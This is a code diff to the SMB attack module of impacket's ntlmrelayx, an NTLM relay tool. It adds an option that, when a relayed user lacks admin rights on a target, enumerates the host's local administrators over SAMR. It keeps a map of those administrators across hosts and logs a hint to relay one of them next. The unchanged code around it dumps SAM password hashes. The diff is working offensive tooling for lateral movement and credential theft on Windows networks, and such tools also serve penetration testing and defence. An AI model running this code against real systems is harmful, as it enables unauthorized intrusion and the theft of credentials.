@@ -22,8 +22,12 @@ from impacket import smb3, smb
 from impacket.examples import serviceinstall
 from impacket.smbconnection import SMBConnection
 from impacket.examples.smbclient import MiniImpacketShell
+from impacket.dcerpc.v5.rpcrt import DCERPCException
 
 PROTOCOL_ATTACK_CLASS = "SMBAttack"
+
+#Define global localAdminMap
+localAdminMap = {}
 
 class SMBAttack(ProtocolAttack):
     """
@@ -50,6 +54,16 @@ class SMBAttack(ProtocolAttack):
     def __answer(self, data):
         self.__answerTMP += data
 
+    def __updateAdminMap(self, adminNames):
+        global localAdminMap
+        hostname = self.__SMBConnection.getRemoteHost()
+        for name in adminNames:
+            if name in localAdminMap:
+                localAdminMap[name].append(hostname)
+            else:
+                localAdminMap[name] = [hostname]
+        return
+
     def run(self):
         # Here PUT YOUR CODE!
         if self.tcpshell is not None:
@@ -66,6 +80,7 @@ class SMBAttack(ProtocolAttack):
                 self.installService.uninstall()
         else:
             from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+            from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
             samHashes = None
             try:
                 # We have to add some flags just in case the original client did not
@@ -78,7 +93,20 @@ class SMBAttack(ProtocolAttack):
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
             except Exception, e:
-                # Something went wrong, most probably we don't have access as admin. aborting
+                if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
+                    if self.config.enumLocalAdmins:
+                        LOG.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
+                        enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
+                        try:
+                            localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
+                            self.__updateAdminMap(localAdminNames)
+                            LOG.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
+                            for name in localAdminNames:
+                                LOG.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                        except DCERPCException, e:
+                            LOG.info("SAMR access denied")
+                        return
+                # Something else went wrong. aborting
                 LOG.error(str(e))
                 return
 
